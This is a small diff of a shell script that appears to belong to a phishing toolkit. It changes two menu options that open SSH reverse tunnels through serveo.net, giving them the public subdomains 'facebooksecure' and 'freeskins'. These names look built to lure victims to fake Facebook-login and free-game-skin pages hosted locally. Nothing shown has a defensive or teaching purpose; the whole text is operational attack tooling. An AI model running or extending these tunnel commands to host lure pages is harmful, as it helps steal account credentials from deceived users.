@@ -21,10 +21,10 @@ read -p"╰─>> " pil
 echo $pur"___________________________________"
 if [ $pil = 1 ]
 then
-ssh -R facebook_secure.serveo.net:80:localhost:8080 serveo.net
+ssh -R facebooksecure.serveo.net:80:localhost:8080 serveo.net
 fi
 
 if [ $pil = 2 ]
 then
-ssh -R mobile_legends.serveo.net:80:localhost:8080 serveo.net
+ssh -R freeskins.serveo.net:80:localhost:8080 serveo.net
 fi
